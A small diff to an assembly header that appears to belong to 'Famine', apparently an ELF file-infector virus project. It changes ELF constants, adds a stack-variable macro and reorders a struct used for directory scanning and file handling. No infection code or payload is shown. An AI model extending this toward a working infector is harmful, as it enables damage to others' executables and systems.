@@ -4,7 +4,7 @@
 %define	ELF_GNU				0x03010102464c457f
 %define	ELF64_ET_DYN		0x00000001003e0003
 %define	ELF64_ET_EXEC		0x00000001003e0002
-%define	SEGMENT_TYPE		0x0000000500000001
+%define	SEGMENT_TYPE		0x0000000500000001	; p_flags = PF_X | PF_R; p_type = PT_LOAD
 
 ; Syscalls IDs
 
@@ -40,6 +40,7 @@
 
 ; Famine constants
 
+%define VARS(x)				[(rsp - famine_size) + x]
 %define	DIRENT_ARR_SIZE		1024
 
 
@@ -104,11 +105,9 @@
 
 ; Structure for our variables on stack
 
-
-
 	struc	famine
-.dir_fd			resq	1				; Directory fd
 .dirents		resb	DIRENT_ARR_SIZE	; Array of dirents
+.dir_fd			resq	1				; Directory fd
 .file_path		resb	PATH_MAX		; File path buffer
 .file_fd		resq	1				; Open file fd
 .stat			resb	stat_size		; Buffer for stat struct
